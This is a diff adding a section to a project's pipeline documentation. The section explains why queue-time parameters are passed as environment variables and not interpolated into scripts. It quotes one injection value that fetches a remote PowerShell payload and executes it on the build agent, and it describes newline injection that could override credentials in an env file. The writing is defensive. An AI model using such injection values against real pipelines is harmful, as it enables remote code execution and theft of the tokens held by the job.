@@ -14,6 +14,40 @@ automation appearing in another's definition.
 - [Security model](../docs/reference/security-model.md) — how secrets reach a run
 - [Working agreements](../docs/process/working-agreements.md) — who may run what
 
+
+## Queue-time parameters are data, never code
+
+Every queue-time parameter reaches the scripts as an **environment variable**, mapped in
+the step's `env:` block and read with `$env:PARAM_*`. No parameter is interpolated into a
+script body.
+
+That rule exists because a template expression is expanded at **compile time**, before
+the script runs, so interpolating one into a script body pastes the value in as source
+code. `applicationKey`, `organizationUrl` and `project` are free-text `type: string`
+parameters with no closed value list, and all three were interpolated that way. A value of
+
+```text
+x'; iwr http://host/payload.ps1 | iex; '
+```
+
+closed the quoting and ran on the agent, in a job holding `ADO_PAT` and the SFTP
+credentials. Queue permission is not meant to imply permission to read the token.
+
+Two checks back the rule up:
+
+| Check | Where |
+| --- | --- |
+| Every parameter is validated at run time: non-empty where required, single-line always, and matched against an expected pattern | the first step of each pipeline |
+| No template expression appears anywhere except an `env:` assignment | `tests/automations/Automations.Tests.ps1` |
+
+The single-line check is the half that is easy to miss. Even passed as data, a value
+carrying a newline would append arbitrary `KEY=VALUE` lines to `.env.pipeline` — enough
+to override `ADO_PAT` or inject a credential the run would then write.
+
+`command` and `confirmApply` were never exploitable, because one has a closed `values:`
+list and the other is a boolean. They moved to `env:` anyway, so the rule is uniform and
+a future parameter cannot be added by copying an unsafe line.
+
 ## 1. The shared pattern
 
 Every file here follows the same five rules. They are worth stating once rather than
